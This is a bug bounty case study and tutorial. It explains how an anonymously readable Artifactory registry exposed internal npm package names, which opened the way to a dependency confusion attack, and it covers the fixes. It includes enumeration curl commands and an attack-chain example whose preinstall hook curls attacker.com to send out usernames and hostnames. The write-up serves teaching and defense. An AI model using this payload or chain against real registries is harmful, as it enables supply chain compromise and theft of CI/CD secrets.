# CS-02: Artifactory Anonymous Access → Supply Chain RCE

← [[Case-Studies-Overview]]

**Vuln class:** Broken Access Control → Supply Chain Attack  
**Severity:** P1 / CVSS 8.8 HIGH (submitted as CVSS 9.3 Critical)  
**Program:** Large media company VDP (Intigriti)  
**Status:** Submitted, In Triage

---

## TL;DR (30 seconds)

A company ran an internal npm package registry (JFrog Artifactory) accessible from the public internet with anonymous read access enabled. Any unauthenticated visitor could list all internal package namespaces, browse the full package tree, and download the actual source code packages. Nine internal packages were confirmed to have no registration on public npm — meaning an attacker could publish malicious packages under those names on the public registry and poison the company's CI/CD build pipeline (dependency confusion attack).

This is a two-step finding: **information disclosure that enables supply chain RCE**.

---

## Background: What is Dependency Confusion?

Dependency confusion (discovered publicly by Alex Birsan in 2021, earned $130,000+ across multiple companies) is a supply chain attack based on how package managers resolve packages.

When a company uses an internal package registry (like Artifactory, Nexus, or GitHub Packages), they often set up their package manager to check both:
1. The internal registry (for private packages)
2. The public registry (npm, PyPI, etc.) (for open-source packages)

**The attack:**
- If a private package like `@company/internal-tool` exists on the internal registry at version `1.0.0`
- And `@company/internal-tool` does NOT exist on the public npm registry
- An attacker can publish `@company/internal-tool@99.0.0` on public npm with malicious code
- npm resolves the **highest version number** — `99.0.0` on public npm beats `1.0.0` on internal
- The malicious package gets installed on every developer machine and CI/CD pipeline that runs `npm install`

The attack only works if you can **discover the internal package names** — which is exactly what the Artifactory exposure enabled.

---

## How It Was Found

**Step 1: Discover Artifactory during subdomain recon**

During subdomain enumeration, `artifactory.company.com` came up with a live response. JFrog Artifactory has a distinctive UI and specific API endpoints.

**Step 2: Test for anonymous access**

```bash
# JFrog Artifactory API — list all repositories
curl https://artifactory.company.com/api/repositories
```

Expected response if anonymous is disabled: `401 Unauthorized`  
**Actual response: `200 OK` with list of all 9 internal npm repositories**

This is the core finding — anonymous access should never be enabled on an internal package registry.

**Step 3: Browse the package tree**

```bash
# List contents of the npm-local repository
curl https://artifactory.company.com/artifactory/api/storage/npm-local

# Response:
{
  "children": [
    {"uri": "/@company-scope-1", "folder": true},
    {"uri": "/@company-scope-2", "folder": true},
    {"uri": "/@company-scope-3", "folder": true}
  ]
}
```

**Step 4: Download a package (proves unauthorized access)**

```bash
curl -L "https://artifactory.company.com/artifactory/api/npm/npm-virtual/@scope/package-name/-/@scope/package-name-1.0.0.tgz" \
  -o downloaded-package.tgz

# HTTP 200 OK, 3.6MB received
# S3 redirect URL contains: X-Artifactory-username=anonymous
```

The `X-Artifactory-username=anonymous` in the response URL is proof — it's explicitly tagged as an unauthenticated download.

**Step 5: Check public npm for the internal packages**

```bash
# For each discovered internal package scope/name:
curl https://registry.npmjs.org/@company-scope/package-name
# HTTP 404 → not on public npm → dependency confusion possible
```

Nine packages were confirmed: on internal Artifactory, HTTP 404 on public npm.

**Step 6: Document the full attack chain**

```
1. Attacker enumerates: GET /api/repositories → lists @company-scope/internal-pkg v1.0.0
2. Attacker confirms: curl https://registry.npmjs.org/@company-scope/internal-pkg → HTTP 404
3. Attacker publishes to public npm:
   npm publish @company-scope/internal-pkg@99.0.0
   (package.json: {"scripts": {"preinstall": "curl attacker.com/$(whoami)@$(hostname)"}})
4. Developer/CI runs: npm install
5. npm resolves 99.0.0 from public registry (beats internal 1.0.0)
6. preinstall script executes → attacker receives hostname, username, env vars
7. In CI/CD: env vars include AWS keys, deployment tokens, signing certificates
```

---

## CVSS Breakdown

```
AV:N  - Internet-accessible endpoint
AC:L  - Single unauthenticated HTTP GET
PR:N  - No account required
UI:R  - Developer must run npm install (normal workflow)
S:C   - Scope CHANGES: Artifactory access → RCE on every dev machine + CI/CD
C:H   - Full internal source code readable
I:H   - Dependency confusion → execute arbitrary code in CI/CD environment
A:N   - No availability impact

Score: 8.8 HIGH / (submitted as 9.3 with AC:L and complete scope change)
```

**VRT:** `Broken Access Control → Exposed Credentials (Supply Chain)` → **P1**

---

## Why This Is "Two Bugs" Linked Together

This report was initially two separate findings that got merged:

**Bug A:** Artifactory anonymous read (P2 on its own — information disclosure of internal source code)

**Bug B:** Dependency confusion attack path (P1 when you realize Bug A enables B)

The combination is what makes it critical. If Artifactory was locked down, you couldn't enumerate the package names. If the package names were registered on public npm, dependency confusion wouldn't work. Both conditions are present → critical impact.

This is called **chaining vulnerabilities**. The individual findings might be P3 and P2. Combined, they're P1.

> [!TIP]
> When you find an information disclosure, immediately ask: *what does this information enable?* The answer often upgrades the severity from medium to critical.

---

## What Makes This Report Strong

1. **Proof of download** — the actual `.tgz` file was downloaded with the anonymous tag in the URL. Not just "I could enumerate the package names" — actually downloaded 3.6MB of source code.

2. **Cross-referenced public npm** — for each internal package name, showed the HTTP 404 response from the public registry. This is the explicit proof that dependency confusion is possible.

3. **Full attack chain documented** — including the `package.json` payload that would execute arbitrary commands. The triager can see exactly what an attacker would do.

4. **CI/CD confirmation** — the package metadata showed a CI/CD service account as the `createdBy` field, confirming the packages are actively used in automated build pipelines. This upgrades the impact from "developer machines" to "CI/CD secrets."

---

## Key Concept: Why CI/CD Is the Jackpot

CI/CD pipelines are high-value targets because they:
- Have write access to the production codebase
- Have credentials for cloud infrastructure (AWS, GCP, Azure)
- Have package signing keys
- Have deployment secrets

When you say "dependency confusion → CI/CD RCE," you're saying the attacker gets all of that. That's why supply chain findings are often the highest-severity bugs on a program.

---

## Fixes (What Good Looks Like)

**Fix 1 — Disable anonymous access:**  
Admin → Security → Settings → Allow Anonymous Access → OFF. This is the most important fix.

**Fix 2 — Prevent dependency confusion (even if anonymous access is fixed):**

Option A: Configure the npm virtual repository to use "Local Only" resolution — never check public npm for packages that exist internally.

Option B: Add internal scopes to the excluded patterns so they're never resolved against public registries.

Option C (simplest): **Register placeholder packages on public npm** under all internal scopes. A package that just publishes a README saying "this is an internal package" is enough to block dependency confusion.

Option D: Enforce scoped `.npmrc` in all repositories:
```
@company-scope:registry=https://artifactory.company.com/artifactory/api/npm/npm-virtual/
```

---

## Practice This

- Read Alex Birsan's original research: "Dependency Confusion: How I Hacked Into Apple, Microsoft, and Dozens of Other Companies"
- Try the concept in a lab: set up a private npm registry locally and practice the enumeration steps
- On any target: look for `artifactory.`, `nexus.`, `jfrog.`, `packagecloud.`, `packages.` in subdomain enum results

---

*Related: [[A06-Vulnerable-Components]] | [[A08-Software-Integrity-Failures]] | [[Case-Studies-Overview]]*

*Sources: Real Intigriti VDP submission, Alex Birsan's dependency confusion research (2021)*
